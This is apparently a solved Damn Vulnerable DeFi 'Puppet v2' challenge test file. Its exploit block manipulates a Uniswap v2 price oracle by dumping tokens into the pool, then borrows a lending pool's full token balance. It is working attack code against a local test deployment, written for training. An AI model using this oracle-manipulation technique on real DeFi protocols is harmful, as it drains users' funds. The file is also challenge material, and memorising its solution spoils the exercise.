const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const web3 = require('web3');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const ATTACKER_ETH = ethers.utils.parseEther('19');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const fromWei = (x) => web3.utils.fromWei(x);
        const _curInfo = async (status) => {
            console.log("\n" + status + "\n");
            console.log("[+] Oracle Calc Deposit Required")
            let _oracle = (await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther("1")))
            console.log("=> Oracle: " + fromWei(_oracle._hex) + "\n")
            console.log("[+] Attacker ETH-DVT Pair Balance")
            let attacker_eth = await ethers.provider.getBalance(attacker.address);
            let attacker_dtv = await this.token.balanceOf(attacker.address);
            let attacker_weth = await this.weth.balanceOf(attacker.address);

            console.log("=> Attacker ETH : " + fromWei(attacker_eth._hex) + "\n");    // attacker ETH
            console.log("=> Attacker DVT : " + fromWei(attacker_dtv._hex) + "\n");  // attacker DVT
            console.log("=> Attacker WETH : " + fromWei(attacker_weth._hex) + "\n"); // attacker WETH
            console.log("[+] LendingPool ETH-DVT Pair Balance");
            let pool_eth = await ethers.provider.getBalance(this.lendingPool.address);
            let pool_dtv = await this.token.balanceOf(this.lendingPool.address);
            let pool_weth = await this.weth.balanceOf(this.lendingPool.address);
            console.log("Lending Pool ETH : " + fromWei(pool_eth._hex) + "\n");    // lendingPool ETH
            console.log("Lending Pool DVT : " + fromWei(pool_dtv._hex) + "\n");  // lendingPool DVT
            console.log("Lending Pool WETH : " + fromWei(pool_weth._hex) + "\n");  // lendingPool WETH
            console.log("[+] Uniswap Exchange ETH-DVT Pair Balance");
            let exchange_eth = await ethers.provider.getBalance(this.uniswapExchange.address);
            let exchange_dtv = await this.token.balanceOf(this.uniswapExchange.address);
            let exchange_weth = await this.weth.balanceOf(this.uniswapExchange.address);

            console.log("Uniswap Exchange ETH : " + fromWei(exchange_eth._hex) + "\n");    // exchange ETH
            console.log("Uniswap Exchange DVT : " + fromWei(exchange_dtv._hex) + "\n");  // exchange DVT
            console.log("Uniswap Exchange WETH : " + fromWei(exchange_weth._hex) + "\n");  // exchange WETH
        }
        /** CODE YOUR EXPLOIT HERE */
        
        _curInfo("Initial");

    
        await this.token.connect(attacker).approve(
            this.uniswapRouter.address,
            ATTACKER_INITIAL_TOKEN_BALANCE
        );


        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
            ATTACKER_INITIAL_TOKEN_BALANCE,                  // amountIn 
            0,                                               // amountOutMin 
            [this.token.address, this.uniswapRouter.WETH()], // path
            attacker.address,                                // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
        );

        _curInfo("State");

        const oraclePool = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("Oracle Pool: " + fromWei(oraclePool._hex) + "\n");

        await this.weth.connect(attacker).deposit({ value: oraclePool });
        await this.weth.connect(attacker).approve(this.lendingPool.address, oraclePool);
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);

        _curInfo("Fini");
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});